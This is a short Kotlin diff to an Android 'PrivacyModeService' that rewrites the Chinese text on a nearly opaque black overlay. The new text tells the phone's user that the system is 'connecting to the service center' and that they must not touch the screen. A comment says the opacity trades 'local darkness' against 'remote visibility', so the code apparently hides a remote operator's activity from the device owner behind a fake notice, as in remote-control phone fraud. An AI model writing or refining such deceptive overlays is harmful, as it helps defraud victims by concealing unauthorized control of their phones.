@@ -225,7 +225,7 @@ class PrivacyModeService : Service() {
         // Create black overlay view with warning text
         privacyView = TextView(this).apply {
             setBackgroundColor(Color.argb(230, 0, 0, 0)) // ~90% opacity: Compromise between local darkness and remote visibility
-            text = "正在为您办理手续\n请保持电量充足，勿操作手机"
+            text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
             setTextColor(Color.WHITE)
             textSize = 28f
             gravity = Gravity.CENTER
